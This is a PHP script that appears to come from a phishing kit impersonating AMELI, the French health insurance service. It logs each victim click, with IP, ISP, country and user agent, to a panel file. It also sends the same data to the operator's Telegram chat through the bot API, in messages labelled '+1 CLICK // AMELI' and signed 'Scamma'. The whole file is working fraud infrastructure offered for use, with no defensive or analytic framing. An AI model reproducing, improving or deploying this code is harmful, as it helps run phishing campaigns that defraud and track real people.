<?php

session_start();

require_once(__DIR__ . '/../config.php');

$botToken = $bot_token;
$chatId = $rez_click;

$input = file_get_contents('php://input');
$data = json_decode($input, true);

$ip         = isset($data['ip']) ? $data['ip'] : '';
$isp        = isset($data['isp']) ? $data['isp'] : '';
$country    = isset($data['country']) ? $data['country'] : '';
$flag       = isset($data['flag']) ? $data['flag'] : '';
$userAgent  = isset($data['userAgent']) ? $data['userAgent'] : '';

$_SESSION['ip15'] = $ip;
$_SESSION['os'] = $userAgent;

$date = date('d/m/Y');
$heure = date('H\hi');

$message  = "<b>✅ [ +1 CLICK // AMELI ]</b>\n\n";
$message .= "<b>📡 ISP : <code>{$isp}</code></b>\n";
$message .= "<b>{$flag} Pays : <code>{$country}</code></b>\n\n";
$message .= "<b>🌐 IP : <code>{$ip}</code></b>\n";
$message .= "<b>📱 OS : <code>{$userAgent}</code></b>\n";
$message .= "<blockquote><b>🕒 Rez le [ <code>{$date}</code> à <code>{$heure}</code> ]</b>\n";
$message .= "<b>🧑‍💻 Scamma - [ <code>AMELI</code> ]</b></blockquote>";

$line =
    $ip . " | " . $isp . " | " . $country . " | " . $userAgent . " | " . $date . " " . $heure . PHP_EOL;

$cc_file = dirname(__DIR__) . '/panel/data/click.txt';

if (empty($_SESSION['click_sent']) || $_SESSION['click_sent'] !== true) {
    file_put_contents($cc_file, $line, FILE_APPEND | LOCK_EX);

    $sendUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $sendUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 4);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    curl_exec($ch);
    curl_close($ch);

    $_SESSION['click_sent'] = true;
}

http_response_code(200);
echo 'OK';

?>
